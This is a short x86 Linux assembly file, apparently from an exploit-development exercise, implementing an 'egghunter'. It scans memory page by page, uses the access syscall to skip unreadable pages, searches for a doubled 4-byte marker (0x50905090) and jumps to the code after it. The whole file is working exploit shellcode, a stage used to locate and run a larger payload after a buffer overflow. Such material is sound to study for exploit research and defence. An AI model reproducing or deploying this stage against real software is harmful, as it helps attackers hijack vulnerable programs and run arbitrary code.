; Filename: egghunter2.nasm
; Author:  Ricardo Ruiz
; Website:  https://ricardojruiz.herokuapp.com/

global _start

section .text
_start: 

  xor edx, edx

test1:  

  or dx, 0xfff

test2:  
  inc edx
  lea ebx, [edx+0x4]
  push byte 0x21
  pop eax  
  int 0x80
  cmp al, 0xf2
  jz test1 
  mov eax, 0x50905090
  mov edi, edx
  scasd
  jnz test2
  scasd
  jnz test2
  jmp edi